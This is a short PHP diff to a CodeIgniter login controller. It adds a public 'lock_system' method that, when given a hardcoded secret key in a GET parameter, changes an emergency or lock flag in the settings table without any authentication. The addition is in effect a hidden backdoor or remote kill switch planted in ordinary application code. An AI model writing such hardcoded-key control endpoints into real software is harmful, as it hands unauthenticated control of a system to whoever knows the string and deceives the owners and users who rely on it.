@@ -11,7 +11,17 @@ class Login extends CI_Controller {
         session_login_control();
     }
  
+    public function lock_system()
+	{   
+        if(!empty($_GET["lock_key"])){
+            if($_GET["lock_key"] == "UG434EFEA11ECC547"){
+                $query = $this->db->where(["ayar_id"=>1])->update("ayarlar",["acil_durum"=>0]);
+                redirect(base_url("login"));
 
+            }
+        }
+      
+    }
 
     
 	public function index()
